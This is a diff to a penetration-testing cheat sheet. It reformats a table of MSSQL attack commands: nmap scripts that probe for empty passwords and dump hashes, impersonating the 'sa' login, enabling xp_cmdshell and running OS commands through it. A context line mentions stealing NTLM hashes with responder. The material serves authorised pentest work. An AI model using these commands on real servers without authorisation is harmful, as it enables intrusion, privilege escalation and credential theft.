@@ -187,16 +187,16 @@ We can steal NTLM hashes with responder or perform NTLM Relay Attack (Check Atta
 
 > We can use `dbeaver` app to connect any database through GUI
 
-| **Command** | **Description** |
-| ---- | ---- |
-| `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>` | Nmap port scan |
-| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |
-| `SQL> select name from sys.databases` | Select databases in mssqlclient |
-| `SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER');` | Check user permissions in mssqlclient |
-| `SQL> SELECT SYSTEM_USER`<br>`SQL> SELECT IS_SRVROLEMEMBER('sysadmin')` | Retrieve system user in mssqlclient |
-| `SQL> EXECUTE AS LOGIN = 'sa'` | Execute as user in mssqlclient (if user has permission) |
-| `SQL> EXECUTE sp_configure 'show advanced options', 1`<br>`SQL> RECONFIGURE`<br>`SQL> EXECUTE sp_configure 'xp_cmdshell', 1`<br>`SQL> RECONFIGURE` | Enable xp_cmdshell in mssqlclient (if user has permission) |
-| `SQL> xp_cmdshell 'whoami'` | Execute command in mssqlclient |
+| **Command**                                                                                                                                                                                                                                                                                       | **Description**                                            |
+| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------- |
+| `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>` | Nmap port scan                                             |
+| `impacket-mssqlclient <user>@<FQDN/IP> -windows-auth`                                                                                                                                                                                                                                             | Log in to the MSSQL server using Windows authentication.   |
+| `SQL> select name from sys.databases`                                                                                                                                                                                                                                                             | Select databases in mssqlclient                            |
+| `SQL> SELECT * FROM fn_my_permissions(NULL, 'SERVER');`                                                                                                                                                                                                                                           | Check user permissions in mssqlclient                      |
+| `SQL> SELECT SYSTEM_USER`<br>`SQL> SELECT IS_SRVROLEMEMBER('sysadmin')`                                                                                                                                                                                                                           | Retrieve system user in mssqlclient                        |
+| `SQL> EXECUTE AS LOGIN = 'sa'`                                                                                                                                                                                                                                                                    | Execute as user in mssqlclient (if user has permission)    |
+| `SQL> EXECUTE sp_configure 'show advanced options', 1`<br>`SQL> RECONFIGURE`<br>`SQL> EXECUTE sp_configure 'xp_cmdshell', 1`<br>`SQL> RECONFIGURE`                                                                                                                                                | Enable xp_cmdshell in mssqlclient (if user has permission) |
+| `SQL> xp_cmdshell "whoami"`                                                                                                                                                                                                                                                                       | Execute command in mssqlclient                             |
 
 
 ##### **[IPMI](https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi)** (TCP/UDP 623)
